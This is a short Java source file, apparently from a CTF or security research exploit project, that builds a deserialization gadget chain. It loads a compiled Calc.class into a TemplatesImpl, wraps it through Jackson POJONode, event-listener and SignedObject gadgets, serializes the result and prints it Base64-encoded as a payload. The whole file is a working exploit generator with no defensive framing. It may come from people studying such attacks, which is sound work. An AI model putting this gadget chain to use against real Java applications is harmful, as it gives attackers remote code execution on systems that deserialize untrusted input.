package exp;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import exp.tools.GadgetGen;
import exp.tools.ReflectTools;
import exp.tools.TemplatesGen;
import exp.tools.UnsafeTools;
import javassist.CannotCompileException;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.util.Base64;

public class Exp {
    public static void main(String[] args) throws Exception {
        Templates templates = TemplatesGen.getTemplates2(null, "D:/1tmp/classes/Calc.class");
        Object pojo = GadgetGen.pojo(templates);
        Object eventListener = GadgetGen.eventListener(pojo);

        Object signedObj = GadgetGen.signedObj(eventListener);
        POJONode node = new POJONode(signedObj);
        Object eventListener1 = GadgetGen.eventListener(node);



        byte[] bytes = ReflectTools.ser2bytes(eventListener1);
        String s = Base64.getEncoder().encodeToString(bytes);
        System.out.println(s);
//        ReflectTools.deser(bytes, null);


    }
}
